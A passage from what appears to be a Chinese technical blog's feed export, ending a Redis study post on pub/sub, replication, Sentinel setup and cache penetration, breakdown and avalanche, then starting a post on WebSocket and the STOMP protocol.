<li>在<strong>第二个 redis-cli 客户端</strong>输入 <strong>PUBLISH runoobChat “Redis PUBLISH test”</strong> 往 runoobChat 频道发送消息，这个时候在第一个 redis-cli 客户端就会看到由第二个 redis-cli 客户端发送的测试消息。</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Redis是使用C实现的，通过分析 Redis 源码里的 pubsub.c 文件，了解发布和订阅机制的底层实现，籍此加深对 Redis 的理解。<img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/9UIQvxFketd8mSc.jpg"
                      alt="Screenshot_2.jpg"
                ></p>
<p>通过 SUBSCRIBE 命令订阅某频道后，redis-server 里维护了一个字典，字典的键就是一个个 频道！</p>
<p>而字典的值则是一个链表，链表中保存了所有订阅这个 channel 的客户端。SUBSCRIBE 命令的关键，就是将客户端添加到给定 channel 的订阅链表中</p>
<p>通过 PUBLISH 命令向订阅者发送消息，redis-server 会使用给定的频道作为键，在它所维护的 channel字典中查找记录了订阅这个频道的所有客户端的链表，遍历这个链表，将消息发布给所有订阅者。</p>
<p>Pub&#x2F;Sub 从字面上理解就是发布（Publish）与订阅（Subscribe），在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这一功能最明显的用法就是用作实时消息系统，比如普通的即时聊天，群聊等功能。</p>
<p><strong>使用场景：</strong></p>
<p>1、实时消息系统！</p>
<p>2、事实聊天！（频道当做聊天室，将信息回显给所有人即可！）</p>
<p>3、订阅，关注系统都是可以的！</p>
<p>稍微复杂的场景我们就会使用 消息中间件 MQ （）</p>
<h1 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h1><p><strong>概念</strong></p>
<p>主从复制，是指<strong>将一台Redis服务器的数据，复制到其他的Redis服务器</strong>。</p>
<p>前者称为主节点(master&#x2F;leader)，后者称为从节点(slave&#x2F;follower)；数据的复制是单向的，只能由主节点到从节点。</p>
<p>Master以写为主，Slave 以读为主。</p>
<p>默认情况下，每台Redis服务器都是主节点；</p>
<p>且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>
<p><strong>主从复制的作用主要包括：</strong></p>
<p>1、数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</p>
<p>2、故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</p>
<p>3、负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</p>
<p>4、高可用（集群）基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</p>
<p>一般来说，要将Redis运用于工程项目中，只使用一台Redis是万万不能的（宕机），原因如下：</p>
<p>1、从结构上，单个Redis服务器会发生单点故障，并且一台服务器需要处理所有的请求负载，压力较大；</p>
<p>2、从容量上，单个Redis服务器内存容量有限，就算一台Redis服务器内存容量为256G，也不能将所有内存用作Redis存储内存，一般来说，单台Redis最大使用内存不应该超过20G。</p>
<p>电商网站上的商品，一般都是一次上传，无数次浏览的，说专业点也就是”多读少写”。</p>
<p>对于这种场景，我们可以使如下这种架构：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/dTpx9UKtAL6wHvj.jpg"
                      alt="Screenshot_3.jpg"
                ></p>
<p>主从复制，读写分离！ 80% 的情况下都是在进行读操作！减缓服务器的压力！架构中经常使用！ 一主二从！</p>
<p>只要在公司中，主从复制就是必须要使用的，因为在真实的项目中不可能单机使用Redis！ </p>
<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><p>环境配置的时候只需要配置从节点，redis默认主节点。</p>
<p>复制<code>redis.conf</code>文件，将从Redis节点的相关配置文件修改为如下值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从Redis端口 </span></span><br><span class="line">port 6380 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 把pid进程号写入pidfile配置的文件</span></span><br><span class="line">pidfile /var/run/redis_6380.pid  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志文件</span></span><br><span class="line">logfile <span class="string">&quot;6380.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定数据存放目录</span></span><br><span class="line"><span class="built_in">dir</span> /usr/local/redis‐5.0.3/data/6380 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台启动</span></span><br><span class="line">daemonize <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭保护模式，开启的话，只有本机才可以访问redis</span></span><br><span class="line">protected‐mode no </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释掉 bind 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置主从复制 </span></span><br><span class="line"><span class="comment"># 从本机6379的redis实例复制数据，Redis5.0之前使用slaveof而不是replicaof</span></span><br><span class="line"><span class="comment"># replicaof 192.168.65.61 6379 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置从节点只读 </span></span><br><span class="line">replica‐<span class="built_in">read</span>‐only <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>之后是从节点的手动命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; info replication <span class="comment"># 查看当前库的信息</span></span><br><span class="line"><span class="comment"># 手动说明主节点是哪个？</span></span><br><span class="line">127.0.0.1:6380&gt; SLAVEOF 127.0.0.1 6379 <span class="comment"># SLAVEOF host 6379 找谁当自己的老大！</span></span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>当主机被<code>shutdown</code>后，从机依旧连接主机，但是没有写的操作。</p>
<p>这个时候主机回来后，从机依旧可以获取主机写的信息。</p>
<p>如果是命令行配置的从机，那么在重启从机之后会又变成主机。</p>
<p>但是重新给这个从机配置，就会读取主机的值</p>
<h2 id="主从工作原理"><a href="#主从工作原理" class="headerlink" title="主从工作原理"></a>主从工作原理</h2><p>如果你为master配置了一个slave，主从数据同步的步骤如下：</p>
<ol>
<li>不管这个slave是否是第一次连接上Master，它都会发送一个<strong>PSYNC</strong>命令给master<strong>请求复制数据。</strong></li>
<li>master收到PSYNC命令后，会在后台进行数据持久化，通过<code>bgsave</code>生成最新的rdb快照文件。</li>
<li>持久化期间，master会继续接收客户端的请求，它会把这些可能修改数据集的请求缓存在内存中。</li>
<li>当master持久化进行完毕以后，master会把这份rdb文件数据集发送给slave。</li>
<li>slave把接收到的数据进行持久化生成rdb文件，并且清除老数据，然后再加载到内存中。</li>
<li>master再将之前缓存在内存中的命令发送给slave，slave再次进行数据同步。</li>
</ol>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/y6rnf8Fc7H5pjZd.jpg"
                      alt="Screenshot_4.jpg"
                ></p>
<p>全量复制：而slave服务在接收到数据库文件数据后，将其存盘并加载到内存中。</p>
<p>增量复制：Master 继续将新的所有收集到的修改命令依次传给slave，完成同步</p>
<p>只要是重新连接master，一次完全同步（全量复制）将被自动执行！ 我们的数据一定可以在从机中看到！</p>
<h2 id="主机宕机"><a href="#主机宕机" class="headerlink" title="主机宕机"></a>主机宕机</h2><p>当主机宕机之后，那么就不能进行写操作了。</p>
<p>这个时候就会出问题。</p>
<ul>
<li>谋朝篡位</li>
</ul>
<p>如果主机断开了连接，我们可以使用 <code>SLAVEOF no one</code> 让自己变成主机！其他的节点就可以手动连</p>
<p>接到最新的这个主节点（手动）！如果这个时候老大修复了，那就重新连接！</p>
<p>那么引下来的就是另外一个知识点了</p>
<h1 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a>哨兵模式</h1><p>主从切换技术的方法是：当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。</p>
<p>Redis从2.8开始正式提供了Sentinel（哨兵） 架构来解决这个问题。</p>
<p>谋朝篡位的自动版，能够后台监控主机是否故障，如果故障了根据投票数自动将从库转换为主库。</p>
<p>sentinel哨兵是特殊的redis，它们不提供读写服务，主要用来监控redis实例节点。 哨兵架构下客户端第一次从哨兵找出redis的主节点，后续就直接访问redis的主节点，不会每次都通过sentinel代理访问redis的主节点。当redis的主节点发生变化，哨兵会第一时间感知到，并且将新的redis主节点通知给客户端(这里面redis的客户端一般都实现了订阅功能，订阅sentinel发布的节点变动消息) 。</p>
<h2 id="配置方式-1"><a href="#配置方式-1" class="headerlink" title="配置方式"></a>配置方式</h2><p>Redis中为我们提供了<code>sentinel.config</code>哨兵配置文件，只要拷贝后稍作修改即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制一份sentinel.conf文件，假设哨兵节点的端口号为26379</span></span><br><span class="line"><span class="built_in">cp</span> sentinel.conf sentinel‐26379.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台启动</span></span><br><span class="line">daemonize <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭保护模式，开启的话，只有本机才可以访问redis</span></span><br><span class="line">protected‐mode no </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释掉 bind 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改端口号</span></span><br><span class="line">port 26379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把pid进程号写入pidfile配置的文件</span></span><br><span class="line">pidfile /var/run/redis_26379.pid  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志文件</span></span><br><span class="line">logfile <span class="string">&quot;26379.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定数据存放目录</span></span><br><span class="line"><span class="built_in">dir</span> /usr/local/redis‐5.0.3/data/26379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监控集群的主节点，格式为：</span></span><br><span class="line"><span class="comment"># sentinel monitor &lt;master‐redis‐name&gt; &lt;master‐redis‐ip&gt; &lt;master‐redis‐port&gt; &lt;quorum&gt;</span></span><br><span class="line"><span class="comment"># quorum是一个数字，表示当有多少个sentinel认为一个master失效时(值一般为：sentinel总数/2 + 1)，</span></span><br><span class="line"><span class="comment"># master才算真正失效 </span></span><br><span class="line">sentinel monitor mymaster 192.168.65.61 6379 2 <span class="comment"># mymaster这个名字随便取，客户端访问时会用到</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动sentinel哨兵实例，指定哨兵配置文件</span></span><br><span class="line">src/redis‐sentinel sentinel‐26379.conf</span><br></pre></td></tr></table></figure>

<p>可以配置多个哨兵节点，按照上述内容稍作修改即可。sentinel集群都启动完毕后，会将哨兵集群的元数据信息写入所有sentinel的配置文件里去(追加在文件的最下面)，我们查看下如下配置文件<code>sentinel-26379.conf</code>，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash</span><br><span class="line"><span class="comment"># 代表主节点的从节点信息</span></span><br><span class="line">sentinel known‐replica mymaster 192.168.65.61 6380</span><br><span class="line">sentinel known‐replica mymaster 192.168.65.61 6381</span><br><span class="line"><span class="comment"># 其它哨兵节点</span></span><br><span class="line">sentinel known‐sentinel mymaster 192.168.65.61 26380 52d0a5d70c1f90475b4fc03b6ce7c3c569 35760f</span><br><span class="line">sentinel known‐sentinel mymaster 192.168.65.61 26381 e9f530d3882f8043f76ebb8e1686438ba8 bd5ca6</span><br></pre></td></tr></table></figure>

<p>Redis主节点如果挂了，哨兵集群会重新选举出新的Redis主节点，同时会修改所有sentinel节点配置文件的集群元数据信息。比如主节点6379挂了，假设选举出的新主节点是6380，则sentinel文件里的集群元数据信息会变成如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash</span><br><span class="line"><span class="comment"># 代表主节点的从节点信息</span></span><br><span class="line">sentinel known‐replica mymaster 192.168.65.61 6379</span><br><span class="line">sentinel known‐replica mymaster 192.168.65.61 6381</span><br><span class="line"><span class="comment"># 其它哨兵节点</span></span><br><span class="line">sentinel known‐sentinel mymaster 192.168.65.61 26380 52d0a5d70c1f90475b4fc03b6ce7c3c569 35760f</span><br><span class="line">sentinel known‐sentinel mymaster 192.168.65.61 26381 e9f530d3882f8043f76ebb8e1686438ba8 bd5ca6</span><br></pre></td></tr></table></figure>

<p>同时还会修改sentinel文件里之前配置的<code>mymaster</code>对应的6379端口，改为6380：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sentinel monitor mymaster 192.168.65.61 6380 2</span><br></pre></td></tr></table></figure>

<p>当端口号为6379的Redis实例再次启动时，哨兵集群根据集群元数据信息就可以将6379端口的Redis节点作为从节点加入集群。</p>
<h2 id="哨兵leader选举"><a href="#哨兵leader选举" class="headerlink" title="哨兵leader选举"></a>哨兵leader选举</h2><p>当一个master服务器被某sentinel视为下线状态后，该sentinel会与其他sentinel协商，选出sentinel中的leader进行故障转移工作。每个发现master下线的sentinel都可以要求其他sentinel选自己为leader，选举是先到先得。同时每个sentinel每次选举都会自选举周期，每个周期中只会选出一个leader。如果所有超过一半的sentinel选举某sentinel作为leader，那么就表示选举成功。之后该sentinel进行故障转移操作，从存活的slave中选举出新的master，这个选举过程跟集群的master选举很类似。</p>
<p>如果哨兵集群只有一个sentinel，redis的主从也能正常运行以及选举master，如果master挂了，那唯一的那个sentinel就是leader了，可以正常选举新master。不过为了高可用一般都推荐至少部署三个sentinel。</p>
<h2 id="哨兵模式优缺点"><a href="#哨兵模式优缺点" class="headerlink" title="哨兵模式优缺点"></a><strong>哨兵模式优缺点</strong></h2><p>优点：</p>
<p>1、哨兵集群，基于主从复制模式，所有的主从配置优点，它全有</p>
<p>2、 主从可以切换，故障可以转移，系统的可用性就会更好</p>
<p>3、哨兵模式就是主从模式的升级，手动到自动，更加健壮！</p>
<p>缺点：</p>
<p>1、Redis 不好啊在线扩容的，集群容量一旦到达上限，在线扩容就十分麻烦！</p>
<p>2、实现哨兵模式的配置其实是很麻烦的，里面有很多选择！</p>
<h1 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h1><p>缓存穿透是指查询一个根本不存在的数据， 缓存层和存储层都不会命中， 通常出于容错的考虑， 如果从存储层查不到数据则不写入缓存层。</p>
<p>用户想要查询一个数据，发现redis内存数据库没有，也就是缓存没有命中，于是向持久层数据库查询。发现也没有，于是本次查询失败。当用户很多的时候，缓存都没有命中（秒杀！），于是都去请求了持久层数据库。这会给持久层数据库造成很大的压力，这时候就相当于出现了缓存穿透。 </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/ruYMF965Eb8pgRT.jpg"
                      alt="Screenshot_5.jpg"
                ></p>
<p>缓存穿透将导致不存在的数据每次请求都要到存储层去查询， 失去了缓存保护后端存储的意义。 造成缓存穿透的基本原因有两个：自身业务代码或者数据出现问题或者一些恶意攻击、 爬虫等造成大量空命中。 主要有如下两种解决方案：</p>
<ul>
<li><strong>缓存空对象</strong></li>
</ul>
<p>当请求到来时，先去Redis缓存层中查询数据，如果没查询到，再到数据库中查。<strong>若从数据库中也没有查到，那么就将该key缓存到redis中并且value置为空</strong>，接着再设置一个过期时间，就可以有效防止缓存穿透。</p>
<p>但是这种方法会存在两个问题：</p>
<p>1、如果空值能够被缓存起来，这就意味着缓存需要更多的空间存储更多的键，因为这当中可能会有很多的空值的键；</p>
<p>2、即使对空值设置了过期时间，还是会存在缓存层和存储层的数据会有一段时间窗口的不一致，这对于需要保持一致性的业务会有影响。</p>
<ul>
<li><strong>布隆过滤器</strong></li>
</ul>
<p>对于恶意攻击，向服务器请求大量不存在的数据造成的缓存穿透，可以通过<a class="link"   href="https://jimmyz.top/2020/05/09/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%AE%97%E6%B3%95/" >布隆过滤器<i class="fas fa-external-link-alt"></i></a>先做一次过滤，对于不存在的数据布隆过滤器一般都能够过滤掉，不让请求再往后端发送。布隆过滤器的特点是：<strong>计算出某个值存在时，这个值可能不存在；计算出某个值不存在时，那就肯定不存在。</strong> <code>Redisson</code>客户端提供了布隆过滤器的功能：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedissonBloomFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">        config.useSingleServer().setAddress(<span class="string">&quot;redis://192.168.65.61:6379&quot;</span>); </span><br><span class="line">        <span class="type">RedissonClient</span> <span class="variable">redisson</span> <span class="operator">=</span> Redisson.create(config); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个布隆过滤器，传入一个key的名称</span></span><br><span class="line">        RBloomFilter&lt;String&gt; bloomFilter = redisson.getBloomFilter(<span class="string">&quot;bloomfilter&quot;</span>);</span><br><span class="line">        <span class="comment">// 初始化布隆过滤器，两个参数：</span></span><br><span class="line">        <span class="comment">// 1. 预计元素个数</span></span><br><span class="line">        <span class="comment">// 2. 误差率为</span></span><br><span class="line">        <span class="comment">// 根据这两个参数Redisson会计算出布隆过滤器所需要的的bit数组大小 </span></span><br><span class="line">        bloomFilter.tryInit(<span class="number">100000000L</span>,<span class="number">0.03</span>); </span><br><span class="line">        <span class="comment">// 向布隆过滤器中添加key</span></span><br><span class="line">        bloomFilter.add(<span class="string">&quot;liduoan&quot;</span>); </span><br><span class="line">        <span class="comment">// 判断key是否在布隆过滤器中</span></span><br><span class="line">        System.out.println(bloomFilter.contains(<span class="string">&quot;guojia&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建完布隆过滤器后，需要将所有的key都添加到过滤器中。布隆过滤器占用的空间其实并不大，100亿个bit位也就是1G多的内存空间，但它的缺点是<strong>不能删除数据，如果要删除得重新初始化数据</strong>。</p>
<h3 id="缓存失效-击穿"><a href="#缓存失效-击穿" class="headerlink" title="缓存失效(击穿)"></a>缓存失效(击穿)</h3><p>类比打击一个点，打穿了直接打到数据库层。</p>
<p>缓存击穿，是指一个key非常热点，在不停的扛着大并发，大并发集中对这一个点进行访问，当这个key在失效的瞬间，持续的大并发就穿破缓存，直接请求数据库，就像在一个屏障上凿开了一个洞。</p>
<p>当某个key在过期的瞬间，有大量的请求并发访问，这类数据一般是热点数据，由于缓存过期，会同时访问数据库来查询最新数据，并且回写缓存，会导使数据库瞬间压力过大。</p>
<p>解决方案：</p>
<p><strong>设置热点数据永不过期</strong></p>
<p>从缓存层面来看，没有设置过期时间，所以不会出现热点 key 过期后产生的问题。</p>
<p>或者可以将过期时间相同的一批数据的过期时间设置为<code>基础过期时间 + 随机数</code>。</p>
<p><strong>加互斥锁</strong></p>
<p>分布式锁：使用分布式锁，保证对于每个key同时只有一个线程去查询后端服务，其他线程没有获得分布式锁的权限，因此只需要等待即可。这种方式将高并发的压力转移到了分布式锁，因此对分布式锁的考验很大。</p>
<h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a><strong>缓存雪崩</strong></h3><p>缓存雪崩，是指在某一个时间段，缓存集中过期失效。Redis 宕机！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/ZGzRWfUPnEVF1g8.jpg"
                      alt="Screenshot_6.jpg"
                ></p>
<p>产生雪崩的原因之一，比如在写本文的时候，马上就要到双十二零点，很快就会迎来一波抢购，这波商品时间比较集中的放入了缓存，假设缓存一个小时。那么到了凌晨一点钟的时候，这批商品的缓存就都过期了。而对这批商品的访问查询，都落到了数据库上，对于数据库而言，就会产生周期性的压力波峰。于是所有的请求都会达到存储层，存储层的调用量会暴增，造成存储层也会挂掉的情况。</p>
<p>另一说法：</p>
<blockquote>
<p>缓存雪崩指的是缓存层支撑不住或宕掉后， 流量会像奔逃的野牛一样， 打向后端存储层。由于缓存层承载着大量请求， 有效地保护了存储层， 但是如果缓存层由于某些原因不能提供服务(比如超大并发过来，缓存层支撑不住，或者由于缓存设计不好，类似大量请求访问bigkey，导致缓存能支撑的并发急剧下降)， 于是大量请求都会打到存储层，存储层的调用量会暴增， 造成存储层也会级联宕机的情况。预防和解决缓存雪崩问题， 可以从以下三个方面进行着手：</p>
</blockquote>
<p>解决方法：</p>
<p><strong>redis高可用</strong></p>
<p>这个思想的含义是，既然redis有可能挂掉，那我多增设几台redis，这样一台挂掉之后其他的还可以继续</p>
<p>工作，其实就是搭建的集群。（异地多活！）</p>
<p><strong>限流降级（在<em>SpringCloud</em>讲解过！）</strong></p>
<p>这个解决方案的思想是，在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对</p>
<p>某个key只允许一个线程查询数据和写缓存，其他线程等待。</p>
<p><strong>数据预热</strong></p>
<p>数据加热的含义就是在正式部署之前，我先把可能的数据先预先访问一遍，这样部分可能大量访问的数</p>
<p>据就会加载到缓存中。在即将发生大并发访问前手动触发加载缓存不同的key，设置不同的过期时间，让</p>
<p>缓存失效的时间点尽量均匀。</p>
<hr>
<p>未完待续</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>webSocket</title>
    <url>/2021/03/10/2021/webSocket/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于面试被问到WebSocket，所以需要深入了解清楚</p>
<p>webSocket常用在消息通信方面，那么当我们需要服务端有新的消息时，如何通知客户端进行实时响应？</p>
<p>可以使用的是消息队列和websocket</p>
<h2 id="WebSocket协议的特点"><a href="#WebSocket协议的特点" class="headerlink" title="WebSocket协议的特点"></a>WebSocket协议的特点</h2><ul>
<li>建立在 TCP 协议之上，它需要通过握手连接之后才能通信，服务器端的实现比较容易。</li>
<li>与 HTTP 协议有着良好的兼容性。默认端口也是80或443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</li>
<li>数据格式比较轻量，性能开销小，通信高效。可以发送文本，也可以发送二进制数据。</li>
<li>没有同源限制，客户端可以与任意服务器通信。</li>
<li>协议标识符是ws（如果加密，则为wss），服务器网址就是URL。（例如：ws:&#x2F;&#x2F;<a class="link"   href="http://www.example.com/chat%EF%BC%89" >www.example.com/chat）<i class="fas fa-external-link-alt"></i></a></li>
<li>它是一种双向通信协议，采用异步回调的方式接受消息，当建立通信连接，可以做到持久性的连接，WebSocket服务器和Browser都能主动的向对方发送或接收数据，实质的推送方式是服务器主动推送，只要有数据就推送到请求方。</li>
</ul>
<h2 id="HTTP1-1与WebSocket的异同"><a href="#HTTP1-1与WebSocket的异同" class="headerlink" title="HTTP1.1与WebSocket的异同"></a>HTTP1.1与WebSocket的异同</h2><p>最后，作为总结，让我们再来回顾一下HTTP1.1与WebSocket的相同与不同。加深对WebSocket的理解。</p>
<h2 id="协议层面的异同"><a href="#协议层面的异同" class="headerlink" title="协议层面的异同"></a>协议层面的异同</h2><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><ul>
<li>都是基于TCP的应用层协议。</li>
<li>都使用Request&#x2F;Response模型进行连接的建立。</li>
<li>在连接的建立过程中对错误的处理方式相同，在这个阶段WebSocket可能返回和HTTP相同的返回码。</li>
</ul>
<h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><ul>
<li>HTTP协议基于Request&#x2F;Response，只能做单向传输，是半双工协议，而WebSocket是全双工协议，类似于Socket通信，双方都可以在任何时刻向另一方发送数据。</li>
<li>WebSocket使用HTTP来建立连接，但是定义了一系列新的Header域，这些域在HTTP中并不会使用。换言之，二者的请求头不同。</li>
<li>WebSocket的连接不能通过中间人来转发，它必须是一个直接连接。如果通过代理转发，一个代理要承受如此多的WebSocket连接不释放，就类似于一次DDOS攻击了。</li>
<li>WebSocket在建立握手连接时，数据是通过HTTP协议传输的，但在建立连接之后，真正的数据传输阶段是不需要HTTP协议参与的。</li>
<li>WebSocket传输的数据是二进制流，是以帧为单位的，HTTP传输的是明文传输，是字符串传输，WebSocket的数据帧有序。</li>
</ul>
<hr>
<h3 id="Tip1"><a href="#Tip1" class="headerlink" title="Tip1"></a>Tip1</h3><p>都是为了保持住两者连接，但是http是保持在应用层方面，而websocket是保持在TCP方面，也就是传输层。</p>
<p>省去了HTTP的大量的request和response的头部。节省了流量。</p>
<hr>
<p><strong>WebSocket</strong>协议上并没有规定其消息发送的详细格式。那就意味着每个使用WebSocket的开发者，都需要自己在服务端和客户端定义一套规则，来传输信息。那么，有没有已经造好的轮子呢？答案肯定是有的。这就是<strong>STOMP</strong>。</p>
<h2 id="STOMP-Simple-Text-Oriented-Messaging-Protocol-简介"><a href="#STOMP-Simple-Text-Oriented-Messaging-Protocol-简介" class="headerlink" title="STOMP(Simple Text Oriented Messaging Protocol)简介"></a>STOMP(Simple Text Oriented Messaging Protocol)简介</h2><p>STOMP是一个用于C&#x2F;S之间进行异步消息传输的简单文本协议, 全称是Simple Text Oriented Messaging Protocol。</p>
<blockquote>
<p><a class="link"   href="http://stomp.github.io/index.html" >STOMP官方网站<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>其实STOMP协议并不是为WS所设计的, 它其实是消息队列的一种协议, 和AMQP,JMS是平级的。 只不过由于它的简单性恰巧可以用于定义WS的消息体格式。 目前很多服务端消息队列都已经支持了STOMP, 比如RabbitMQ, Apache ActiveMQ等。很多语言也都有STOMP协议的客户端解析库，像JAVA的Gozirra，C的libstomp，Python的pyactivemq，JavaScript的stomp.js等等。</p>
<h2 id="STOMP协议"><a href="#STOMP协议" class="headerlink" title="STOMP协议"></a>STOMP协议</h2><p>STOMP是一种基于帧的协议，一帧由一个命令，一组可选的Header和一个可选的Body组成。 STOMP是基于Text的，但也允许传输二进制数据。 它的默认编码是UTF-8，但它的消息体也支持其他编码方式，比如压缩编码。</p>
<h3 id="STOMP服务端"><a href="#STOMP服务端" class="headerlink" title="STOMP服务端"></a>STOMP服务端</h3><p>STOMP服务端被设计为客户端可以向其发送消息的一组目标地址。STOMP协议并没有规定目标地址的格式，它由使用协议的应用自己来定义。 例如&#x2F;topic&#x2F;a，&#x2F;queue&#x2F;a，queue-a对于STOMP协议来说都是正确的。应用可以自己规定不同的格式以此来表明不同格式代表的含义。比如应用自己可以定义以&#x2F;topic打头的为发布订阅模式，消息会被所有消费者客户端收到，以&#x2F;user开头的为点对点模式，只会被一个消费者客户端收到。</p>
<h3 id="STOMP客户端"><a href="#STOMP客户端" class="headerlink" title="STOMP客户端"></a>STOMP客户端</h3><p>对于STOMP协议来说, 客户端会扮演下列两种角色的任意一种：</p>
<ul>
<li>作为生产者，通过SEND帧发送消息到指定的地址</li>
<li>作为消费者，通过发送SUBSCRIBE帧到已知地址来进行消息订阅，而当生产者发送消息到这个订阅地址后，订阅该地址的其他消费者会受到通过MESSAGE帧收到该消息</li>
</ul>
<p>实际上，WebSocket结合STOMP相当于构建了一个消息分发队列，客户端可以在上述两个角色间转换，订阅机制保证了一个客户端消息可以通过服务器广播到多个其他客户端，作为生产者，又可以通过服务器来发送点对点消息。</p>
<h3 id="STOMP帧结构"><a href="#STOMP帧结构" class="headerlink" title="STOMP帧结构"></a>STOMP帧结构</h3><blockquote>
<p>COMMAND<br> header1:value1<br> header2:value2</p>
<p>Body^@</p>
</blockquote>
<p>^@表示行结束符</p>
<p>一个STOMP帧由三部分组成:命令，Header(头信息)，Body（消息体）</p>
<ul>
<li>命令使用UTF-8编码格式，命令有SEND、SUBSCRIBE、MESSAGE、CONNECT、CONNECTED等。</li>
<li>Header也使用UTF-8编码格式，它类似HTTP的Header，有content-length,content-type等。</li>
<li>Body可以是二进制也可以是文本。注意Body与Header间通过一个空行（EOL）来分隔。</li>
</ul>
<p>来看一个实际的帧例子：</p>
<blockquote>
<p>SEND<br> destination:&#x2F;broker&#x2F;roomId&#x2F;1<br> content-length:57</p>
<p>{“type”:”ENTER”,”content”:”o7jD64gNifq-wq-C13Q5CRisJx5E”}</p>
</blockquote>
<ul>
<li>第1行：表明此帧为SEND帧，是COMMAND字段。</li>
<li>第2行：Header字段，消息要发送的目的地址，是相对地址。</li>
<li>第3行：Header字段，消息体字符长度。</li>
<li>第4行：空行，间隔Header与Body。</li>
<li>第5行：消息体，为自定义的JSON结构。</li>
</ul>
<p>更多STOMP协议的细节，如果大家感兴趣，可以参考上述的官方网页，有更多详细的帧结构介绍。下面，我们将主要介绍用Springboot和JS实现后端和前端，构建一个WebSocket的小型应用场景。</p>
<hr>
<h3 id="spring中的WebSocket架构"><a href="#spring中的WebSocket架构" class="headerlink" title="spring中的WebSocket架构"></a>spring中的WebSocket架构</h3><p><img  
                     lazyload
                     alt="image"
                     data-src="https://user-gold-cdn.xitu.io/2018/8/13/1652f420d66bb9a0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"
                      alt="img"
                ></p>
<h3 id="图中各个组件介绍："><a href="#图中各个组件介绍：" class="headerlink" title="图中各个组件介绍："></a>图中各个组件介绍：</h3><ul>
<li><strong>生产者型客户端（左上组件）</strong>: 发送SEND命令到某个目的地址(destination)的客户端。</li>
<li><strong>消费者型客户端（左下组件）</strong>: 订阅某个目的地址(destination), 并接收此目的地址所推送过来的消息的客户端。</li>
